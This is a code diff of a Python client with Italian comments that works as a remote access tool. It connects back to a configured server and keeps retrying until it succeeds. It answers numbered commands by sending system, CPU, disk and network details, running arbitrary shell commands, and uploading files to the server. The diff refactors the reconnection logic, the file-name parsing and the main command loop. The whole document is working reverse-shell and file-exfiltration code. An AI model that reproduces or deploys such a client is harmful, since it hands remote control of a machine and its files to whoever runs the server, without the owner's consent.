@@ -15,7 +15,7 @@ def connessione():
     global cwd
     connesso = False
     tempo_attesa = 5
-    
+
     while connesso == False :
         try:
             clientSocket.connect((serverName,serverPort))
@@ -24,35 +24,37 @@ def connessione():
             time.sleep(tempo_attesa)
             tempo_attesa*=2
         else:
-            connesso = True 
+            connesso = True
             cwd = os.getcwd()
             invia_messaggio(cwd)
-            
+
 def invia_messaggio(messaggio):
     global clientSocket
-    while True:
-        try:
-            numripetizioni = math.ceil((len(messaggio)/BUFFER_SIZE))
-            clientSocket.send(str(numripetizioni).encode('utf-8','ignore'))
-            clientSocket.send(messaggio.encode('utf-8','ignore'))
-            break
-        except Exception as e:
-            #Il server si e' disconnesso nel mentre, tentiamo la riconnessione e rimandiamo il messaggio
-            clientSocket.close()
-            clientSocket = socket(AF_INET, SOCK_STREAM)
-            connessione()
+    try:
+        numripetizioni = math.ceil((len(messaggio)/BUFFER_SIZE))
+        clientSocket.send(str(numripetizioni).encode('utf-8','ignore'))
+        ricevi_messaggio()
+        clientSocket.send(messaggio.encode('utf-8','ignore'))
+    except Exception as e:
+        #Il server si e' disconnesso nel mentre, tentiamo la riconnessione e rimandiamo il messaggio
+        clientSocket.close()
+        clientSocket = socket(AF_INET, SOCK_STREAM)
+        connessione()
 
 def ricevi_messaggio():
     global clientSocket
-    while True:
-        try:
-            messaggio = clientSocket.recv(BUFFER_SIZE).decode('utf-8','ignore')
-            return messaggio
-        except Exception as e:
-            #Il server si e' disconnesso nel mentre, tentiamo la riconnessione e la ricezione del messaggio
-            clientSocket.close()
-            clientSocket = socket(AF_INET, SOCK_STREAM)
-            connessione()
+    try:
+        messaggio = clientSocket.recv(BUFFER_SIZE).decode('utf-8','ignore')
+        if (messaggio == ""):
+            raise Exception
+        return messaggio
+    except Exception as e:
+        #Il server si e' disconnesso nel mentre, tentiamo la riconnessione e la ricezione del messaggio
+        clientSocket.close()
+        clientSocket = socket(AF_INET, SOCK_STREAM)
+        connessione()
+        return ""
+
 def getSystemInfo():
     intestazione = "\n=== INFORMAZIONI SUL SISTEMA === \n"
     info_sistema_operativo = platform.uname()
@@ -215,7 +217,7 @@ def executeShellCommand(cmd):
                     output = str(e)
                 else:
                     output = ''
-            else: 
+            else:
             #Tentativo per cambiamento directory relativa
                 try:
                     os.chdir(cwd+'/'+''.join(split_cmd[1]))
@@ -227,16 +229,14 @@ def executeShellCommand(cmd):
     elif cmd == 'systeminfo' and platform.uname().system == "Windows":
         output = subprocess.check_output([cmd]).decode('utf-8','ignore')
     elif split_cmd[0] == "download":
-        if(len(split_cmd)!=2):
-            output = "Non si puo scaricare un file senza nome!"
-        else:
-            output = invia_file(split_cmd[1]) #
-            invio_file = True
-    else: 
+        nomefile = ((cmd.split(" ", 1)[1]).replace('\"',''))
+        output = invia_file(nomefile) #
+        invio_file = True
+    else:
         output = subprocess.getoutput(cmd)
     cwd = os.getcwd()
     if not invio_file:
-        message = output + '<sep>' + cwd 
+        message = output + '<sep>' + cwd
         invia_messaggio(message)
     else:
         message = output+"<sep>"+cwd
@@ -268,7 +268,6 @@ def invia_file(nome):
     time.sleep(1)
     invia_messaggio(f"{size}")
     ricevi_messaggio()
-    progress = tqdm.tqdm(range(size), f"Invio {nome}", unit="B", unit_scale=True, unit_divisor=1024)
 
     with open(nome,"rb") as f:
         while True:
@@ -277,36 +276,36 @@ def invia_file(nome):
             if not bytes_letti:
                 return "Ricezione completata"
             clientSocket.send(bytes_letti)
-            progress.update(len(bytes_letti))
-            
-        
 
-connessione()
-while True:
-    #Ricaviamo la current working directory dell host su cui gira il client
-    #Inviamo una seconda volta la cwd per motivi di interfaccia lato server
-    comando = ricevi_messaggio()
-    
-    if comando == "1":
-        invia_messaggio(getSystemInfo())
-    elif comando == "2":
-        invia_messaggio(getCPUInfo())
-    elif comando == "3":
-        invia_messaggio(getBootTimeInfo())
-    elif comando == "4":
-        invia_messaggio(getMemoryInfo())
-    elif comando == "5":
-        invia_messaggio(getDiskInfo())
-    elif comando == "6":
-        invia_messaggio(getNetworkInfo()+getNetworkStats())
-    elif comando.split('<sep>')[0] == "7":
-        executeShellCommand(comando.split('<sep>')[1])
-    elif comando == "9":
-        riepilogo_informazioni = str(getSystemInfo()+getCPUInfo()+getBootTimeInfo()+getMemoryInfo()+getDiskInfo()+getNetworkInfo()+getNetworkStats())
-        invia_messaggio(riepilogo_informazioni)
-    elif comando == "0":
-        break
-    else:
-        invia_messaggio("Errore comando")
 
-clientSocket.close()
+try:
+    connessione()
+    while True:
+        #Ricaviamo la current working directory dell host su cui gira il client
+        #Inviamo una seconda volta la cwd per motivi di interfaccia lato server
+        comando = ricevi_messaggio()
+        if comando == "1":
+            invia_messaggio(getSystemInfo())
+        elif comando == "2":
+            invia_messaggio(getCPUInfo())
+        elif comando == "3":
+            invia_messaggio(getBootTimeInfo())
+        elif comando == "4":
+            invia_messaggio(getMemoryInfo())
+        elif comando == "5":
+            invia_messaggio(getDiskInfo())
+        elif comando == "6":
+            invia_messaggio(getNetworkInfo()+getNetworkStats())
+        elif comando.split('<sep>')[0] == "7":
+            executeShellCommand(comando.split('<sep>')[1])
+        elif comando == "9":
+            riepilogo_informazioni = str(getSystemInfo()+getCPUInfo()+getBootTimeInfo()+getMemoryInfo()+getDiskInfo()+getNetworkInfo()+getNetworkStats())
+            invia_messaggio(riepilogo_informazioni)
+        elif comando == "0":
+            break
+        elif comando == "":
+            continue
+        else:
+            invia_messaggio("Errore comando")
+finally:
+    clientSocket.close()
